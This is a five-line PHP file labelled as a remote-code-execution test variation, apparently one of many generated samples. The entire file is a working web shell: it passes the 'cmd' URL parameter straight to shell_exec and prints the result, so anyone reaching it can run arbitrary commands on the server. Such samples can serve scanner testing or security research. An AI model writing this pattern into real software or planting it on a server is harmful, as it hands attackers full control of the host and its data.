<?php
// RCE test variation #364
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>